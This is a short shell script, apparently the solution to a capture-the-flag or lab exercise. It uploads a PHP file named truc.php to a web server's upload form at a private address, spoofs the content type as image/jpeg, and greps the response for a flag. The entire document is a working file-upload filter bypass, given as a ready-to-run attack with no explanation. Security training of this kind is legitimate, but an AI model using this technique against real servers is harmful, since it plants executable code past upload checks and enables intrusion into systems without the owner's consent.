#!/bin/sh

cp ~/Desktop/truc.php /tmp/
curl -X POST "http://10.12.1.124/?page=upload" -F "Upload=Upload" -F "MAX_FILE_SIZE=100000" -F "uploaded=@/tmp/truc.php;type=image/jpeg" | grep 'flag'